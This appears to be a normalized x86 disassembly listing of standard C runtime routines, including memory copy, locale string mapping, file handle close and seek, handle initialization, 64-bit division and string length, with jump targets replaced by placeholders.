inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_20080ed
push 0x10
push r--data
call sub_200625c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_20047e1
and [ eax ] 0x0
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] edi
call sub_20047ce
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_20062a1
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_200d189
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20079ba
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20081bf
mov eax [ ebp - 0x1c ]
sub_20081d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_2008258 ]
jmp [ ecx * 4 + jump_table_20082d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2008344 ]
pop esi
pop edi
pop ebp
jmp sub_200d842
jmp [ ecx * 4 + jump_table_20084e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_20083e4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20084e0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_2008344 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_20084e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2008344 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2008344 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2008344 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20084e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20084e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20084e0 ]
sub_2008535
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_20016b0
pop ecx
sub_2008555
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_200d925
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2002d91
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_200d96e
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_20016b0
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_20016b0
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_2008535
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_200178d
pop ecx
cmp eax ebx
je r-xdata
call sub_200db30
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_2007940
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_200d96e
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_200178d
pop ecx
cmp eax ebx
je r-xdata
call sub_200db30
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_2008535
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_2008535
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_200178d
pop ecx
cmp eax ebx
je r-xdata
call sub_200db30
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_20088fa
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_2008555
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200893f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200898a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_200144c
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_200893f
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_200b4f2
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_2008a42
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_200d112
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_20047f4
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_200d112
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_200d112
push 0x1
mov edi eax
call sub_200d112
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_200d08c
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_2008ade
push 0x10
push r--data
call sub_200625c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_20047e1
and [ eax ] 0x0
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] edi
call sub_20047ce
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_20062a1
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_200d189
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_20047ce
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_2008a42
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2008ba1
mov eax [ ebp - 0x1c ]
sub_2008bab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_20016b0
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_2008bdc
push 0x54
push r--data
call sub_200625c
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_200b579
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_200b579
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_20062a1
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200aff6
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200aff6
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_2008e30
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_200d112
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_20047ce
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_20047f4
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_2008ea5
push 0x10
push r--data
call sub_200625c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_20047e1
and [ eax ] 0x0
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] edi
call sub_20047ce
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_20062a1
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_200d189
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2008e30
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2008f77
mov eax [ ebp - 0x1c ]
sub_2008f90
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_2009000
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_2009070
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_20090fb
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_200b613
add esp 0xc
test eax eax
je r-xdata
call sub_200b579
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_20081d0
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_2009152
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_200dbad
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
